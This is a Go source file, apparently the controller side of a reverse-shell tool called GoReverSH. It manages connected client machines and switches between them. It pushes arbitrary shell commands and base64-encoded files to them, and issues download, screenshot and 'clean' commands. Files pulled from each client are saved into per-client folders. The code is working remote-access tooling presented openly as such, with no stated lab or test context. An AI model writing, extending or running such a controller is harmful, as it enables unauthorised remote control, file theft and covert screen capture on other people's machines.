package pkgserver

import (
	"GoReverSH/config"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

type Observer struct {
	Sender         Sender
	State          State
	Subject        <-chan Notification
	PromptViewFlag bool
	Lock           *sync.Mutex
}

func NewObserver(channel chan Notification, lock *sync.Mutex) *Observer {
	state := State{ClientMap: make(map[string]*Client)}
	observer := &Observer{State: state, Subject: channel, PromptViewFlag: false, Lock: lock}
	return observer
}

func (o *Observer) joinClient(client *Client) {
	if client == nil {
		return
	}

	o.State.ClientMap[client.Name] = client
	if o.Sender.connectingClient == nil {
		o.Sender.connectingClient = client
	}
}

func (o *Observer) defectClient(client *Client) {
	if client == nil {
		return
	}

	fmt.Println("Connection Close")
	/*
		client.Conn.Close()
		delete(o.State.ClientMap, client.Name)
	*/
	ok := o.FreeClientMap(*client)
	if !ok {
		return
	}
	if 0 < len(o.State.ClientMap) {
		for _, c := range o.State.ClientMap {
			o.Sender.connectingClient = c
			break
		}
	}
	o.Sender.connectingClient = nil
}

//errorを返すようにする
func (o *Observer) execUpload(notice Notification) error {
	/*
		commands := strings.Split(notice.Command, " ")
		if len(commands) != 2 {
			return errors.New("commands len not 2")
		}
		rootPath := commands[len(commands)-1]
		fsys := os.DirFS(rootPath)
		err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				log.Println(err)
				return errors.New("failed filepath.Walk: " + err.Error())
			}
			if d.IsDir() {
				log.Println(1)

				return nil
			}

			f, err := os.Open(rootPath + "/" + path)
			if err != nil {
				log.Println(err)

				return err
			}

			fstats, err := f.Stat()
			if err != nil {
				log.Println(err)

				return err
			}

			var content []byte
			buff := make([]byte, 1024)
			size := 0

			for {
				n, err := f.Read(buff)
				if err != nil {
					if n == 0 || errors.Is(err, io.EOF) {
						break
					}
					log.Println(err)
					break
				}
				//content + bufの中身を一時的に保存。
				tmp := make([]byte, 0, size+n)
				tmp = append(content[:size], buff[:n]...)
				content = tmp
				size += n
				if n < 1024 {
					break
				}
			}

			imageToBase64 := base64.StdEncoding.EncodeToString(content)
			fileinfo := utils.FileInfo{Name: "download/" + rootPath + "/" + path, Body: []byte(imageToBase64), Size: fstats.Size()}

			output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

			err = json.NewEncoder(o.Sender.connectingClient.Conn).Encode(output)
			if err != nil {
				return nil
			}

			f.Close()

			return nil
		})
		if err != nil {
			log.Println(err)
			return err
		}

		return nil
	*/

	//TODO: dirならzipにして送信
	commands := strings.Split(notice.Command, " ")
	if len(commands) != 2 {
		return errors.New("command len is mnot 2")
	}
	o.Sender.SendMessage(notice.Command)
	file, err := os.Open(commands[len(commands)-1])
	if err != nil {
		log.Println(err)
		return err
	}

	//read
	//最終的な入れ物
	var content []byte
	//読み込むもの
	buf := make([]byte, 1024)
	//読み込む位置
	size := 0
	for {
		//ファイルを読み込む
		n, err := file.Read(buf)
		if err != nil {
			if n == 0 || err == io.EOF {
				break
			}
			log.Println(err)
			break
		}
		//content + bufの中身を一時的に保存。
		tmp := make([]byte, 0, size+n)
		tmp = append(content[:size], buf[:n]...)
		content = tmp
		size += n
	}

	file.Close()
	//fmt.Println(string(content))
	dataToBase64 := base64.StdEncoding.EncodeToString(content)
	o.Sender.SendMessage(dataToBase64)

	return nil
}

func (o *Observer) execCreateFile(notice Notification, outdir string) {
	filePath := strings.Split(notice.Output.FileInfo.Name, "/")
	lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
	//outdir := "./output/" + notice.Client.Name + "/" //config

	srcdir := filepath.Join(outdir, lastPathFromRecievedFile)
	//fmt.Println(srcdir)
	//dir作成
	if _, err := os.Stat(srcdir); os.IsNotExist(err) {
		if err2 := os.MkdirAll(srcdir, 0755); err2 != nil {
			log.Fatalf("Could not create the path %s", outdir+lastPathFromRecievedFile)
		}
	}

	src := filepath.Join(outdir, notice.Output.FileInfo.Name)

	f, err := os.Create(src)
	if err != nil {
		log.Println(err)
		return
	}
	_, err = f.WriteString(string(notice.Output.FileInfo.Body))
	if err != nil {
		log.Println(err)
	}
	f.Close()
}

func (o *Observer) execClientlist() {
	for _, c := range o.State.ClientMap {
		fmt.Println(c)
	}
}

func (o *Observer) execClientSwitch(notice Notification) {
	commands := strings.Split(notice.Command, " ")
	if len(commands) != 2 {
		return
	}
	fmt.Println("before:", o.Sender.connectingClient)
	clientName := commands[1]
	client, ok := o.State.ClientMap[clientName]
	if ok {
		o.Sender.connectingClient = client
		fmt.Println("aftre:", o.Sender.connectingClient)
	} else {
		fmt.Println("not found")
	}
}

func (o *Observer) FreeClientMap(client Client) bool {
	c, ok := o.State.ClientMap[client.Name]
	if c != nil && ok {
		o.State.ClientMap[c.Name].Conn.Close()
		delete(o.State.ClientMap, c.Name)
		return true
	}
	return false
}

//受け取った通知の種別によってメッセージの送信, あるいはメンバーの追加/削除を行います
func (observer Observer) WaitNotice(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			notice := <-observer.Subject
			switch notice.Type {
			case JOIN:
				/*
					observer.State.ClientMap[notice.Client.Name] = notice.Client
					if observer.Sender.connectingClient == nil {
						observer.Sender.connectingClient = notice.Client
					}
				*/
				observer.joinClient(notice.Client)
				observer.printPrompt()

			case DEFECT:
				/*
					fmt.Println("Connection Close")
					notice.Client.Conn.Close()
					delete(observer.State.ClientMap, notice.Client.Name)
					if 0 < len(observer.State.ClientMap) {
						for _, c := range observer.State.ClientMap {
							observer.Sender.connectingClient = c
							break
						}
					}
					observer.Sender.connectingClient = nil
				*/
				observer.defectClient(notice.Client)
				observer.printPrompt()

			case COMMAND:
				//stdoutしないコマンドでもプロンプトが表示されてしまう
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case MESSAGE:
				fmt.Printf("\n%s\n", notice.Output.Message)
				observer.printPrompt()

			case UPLOAD:
				fmt.Println("UPLOAD")
				/*
					commands := strings.Split(notice.Command, " ")
					observer.Sender.SendMessage(notice.Command)
					file, err := os.Open(commands[len(commands)-1])
					if err != nil {
						log.Println(err)
						break
					}

					//read
					//最終的な入れ物
					var content []byte
					//読み込むもの
					buf := make([]byte, 1024)
					//読み込む位置
					size := 0
					for {
						//ファイルを読み込む
						n, err := file.Read(buf)
						if err != nil {
							if n == 0 || err == io.EOF {
								break
							}
							log.Println(err)
							break
						}
						//content + bufの中身を一時的に保存。
						tmp := make([]byte, 0, size+n)
						tmp = append(content[:size], buf[:n]...)
						content = tmp
						size += n
					}

					file.Close()
					//fmt.Println(string(content))
					dataToBase64 := base64.StdEncoding.EncodeToString(content)
					observer.Sender.SendMessage(dataToBase64)
				*/
				observer.execUpload(notice)
				observer.printPrompt()

			case DOWNLOAD:
				fmt.Println("DOWNLOAD")
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case SCREEN_SHOT:
				fmt.Println("SCREENSHOT")
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case CREATE_FILE:
				/*
					filePath := strings.Split(notice.Output.FileInfo.Name, "/")
					lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
					//outdir := "./output/" + notice.Client.Name + "/" //config
					outdir := config.Config.DownloadOutDir + notice.Client.Name + "/" //config

					//dir作成
					if _, err := os.Stat(outdir + lastPathFromRecievedFile); os.IsNotExist(err) {
						if err2 := os.MkdirAll(outdir+lastPathFromRecievedFile, 0755); err2 != nil {
							log.Fatalf("Could not create the path %s", outdir+lastPathFromRecievedFile)
						}
					}

					f, err := os.Create(outdir + notice.Output.FileInfo.Name)
					if err != nil {
						log.Println(err)
						continue
					}
					_, err = f.WriteString(string(notice.Output.FileInfo.Body))
					if err != nil {
						log.Println(err)
					}
					f.Close()
				*/
				outdir := filepath.Join(config.Config.DownloadOutDir, notice.Client.Name) //config
				observer.execCreateFile(notice, outdir)
				observer.printPrompt()

			case CLIST:
				/*
					for _, c := range observer.State.ClientMap {
						fmt.Println(c)
					}
				*/
				observer.execClientlist()
				observer.printPrompt()

			case CSWITCH:
				/*
					fmt.Println("before:", observer.Sender.connectingClient)
					clientName := strings.Split(notice.Command, " ")[1]
					client, ok := observer.State.ClientMap[clientName]
					if ok {
						observer.Sender.connectingClient = client
						fmt.Println("aftre:", observer.Sender.connectingClient)
					} else {
						fmt.Println("not found")
					}
				*/
				observer.execClientSwitch(notice)
				observer.printPrompt()

			case CLEAN:
				fmt.Println("CLEAN")
				observer.Sender.SendMessage(notice.Command)

			default:
				log.Println("command is not found")
			}
		}
	}
}

func (o Observer) printPrompt() {
	if o.Sender.connectingClient != nil {
		fmt.Printf("\n[GoReverSH@%s]>", o.Sender.connectingClient.Name)
	} else {
		fmt.Println("wait...")
	}
}
